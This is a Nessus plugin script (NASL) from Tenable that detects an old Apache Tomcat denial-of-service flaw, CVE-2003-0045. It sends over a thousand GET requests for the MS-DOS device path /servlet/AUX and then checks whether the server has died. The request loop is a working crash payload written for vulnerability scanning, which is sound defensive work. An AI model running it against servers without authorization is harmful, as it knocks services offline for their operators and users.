#
# (C) Tenable network Security, Inc.
#

# See also script 10930 http_w98_devname_dos.nasl
#
# Vulnerable servers:
# Apache Tomcat 3.3
# Apache Tomcat 4.0.4
# All versions prior to 4.1.x is affected as well.
# Apache Tomcat 4.1.10 (and probably higher) is not affected.
#
# Microsoft Windows 2000
# Microsoft Windows NT is affected as well.
#
# References:
# Date: Fri, 11 Oct 2002 13:36:55 +0200
# From:"Olaf Schulz" <olaf.schulz@t-systems.com>
# To:cert@cert.org, bugtraq@securityfocus.com, vulnwatch@vulnwatch.org
# Subject: Apache Tomcat 3.x and 4.0.x: Remote denial of service vulnerability
#

include("compat.inc");

if (description)
{
 script_id(11150);
 script_version("$Revision: 1.29 $");
 script_cvs_date("$Date: 2016/05/09 20:31:00 $");

 script_cve_id("CVE-2003-0045");
 script_osvdb_id(12233);

 script_name(english:"Apache Tomcat MS-DOS Device Name Request DoS");
 script_summary(english:"Kills Apache Tomcat by reading 1000+ times a MS/DOS device through the servlet engine.");

 script_set_attribute(attribute:"synopsis", value:
"The instance of Apache Tomcat running on the remote host is affected
by a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to freeze or crash Windows or the Apache Tomcat web
server by reading thousands of times an MS/DOS device through the
Tomcat servlet engine, using a file name like /examples/servlet/AUX.

An attacker can exploit this flaw to make your system crash
continuously, preventing you from working properly.");
 script_set_attribute(attribute:"solution", value:"Upgrade to Apache Tomcat version 4.1.10.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/03/26");
 script_set_attribute(attribute:"patch_publication_date", value:"2002/09/06");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/10/25");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:tomcat");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright("This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencies("tomcat_error_version.nasl");
 script_require_keys("www/tomcat", "Settings/ParanoidReport");
 script_require_ports("Services/www", 8080);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

start_denial();
port = get_http_port(default:8080);

# Another FP avoidance
get_kb_item_or_exit("www/"+port+"/tomcat");

if (http_is_dead(port: port)) exit(1, "The remote host is not responding on port "+port+".");
soc = http_open_socket(port);
if (! soc) exit(1, "Could not open socket to port "+port+".");

# We should know where the servlets are
url = "/servlet/AUX";

for (i = 0; i <= 1000; i = i + 1)
{
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res))
  {
    sleep(1);
    res = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(res))
      break;
  }
}

alive = end_denial();
if (! alive && http_is_dead(port: port, retry: 3))
{
  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else exit(0, "The remote Tomcat install on port "+port+" is not affected.");
